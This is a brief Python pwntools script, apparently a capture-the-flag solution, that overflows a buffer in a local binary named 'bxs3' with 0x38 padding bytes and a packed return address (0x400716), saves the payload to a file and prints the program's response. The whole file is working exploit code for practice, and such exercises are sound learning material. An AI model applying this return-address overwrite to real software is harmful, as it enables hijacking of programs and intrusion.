from pwn import *


io = process('./bxs3')

padding = 'a'*0x38
fp = open("exp", "wb")

payload = padding + p64(0x400716)
fp.write(payload)
io.send(payload)
io.recvuntil("Are you haluki?\n")

print io.recvline()
print io.recvline()

fp.close()


